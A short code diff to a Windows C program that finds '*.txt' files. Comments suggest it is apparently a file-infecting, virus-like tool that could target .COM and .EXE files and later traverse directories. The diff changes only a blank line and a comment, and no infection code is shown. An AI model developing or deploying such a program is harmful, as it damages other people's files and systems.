@@ -16,7 +16,6 @@ Ideas:
 - Make it traverse Directories
 */
 
-
 #include <windows.h>
 #include <stdio.h>
 
@@ -47,7 +46,7 @@ int main(void) {
         printf("[-] YOU IDIOT!! YOU (probably) FORGOT TO CHANGE THE NAME ABOVE!!\n");
     }
 
-    hFind = FindFirstFile("*.txt", &FindFileData); // change accordingly -> It would work pretty well on .COM and .EXE files (though noticable)
+    hFind = FindFirstFile("*.txt", &FindFileData); // change accordingly -> It would work pretty well on .COM and .EXE files (though noticable and maybe too big for COM files)
     if (hFind == INVALID_HANDLE_VALUE) {
         printf("[-] FindFirstFile failed (%ld)\n", GetLastError());
         return 1;
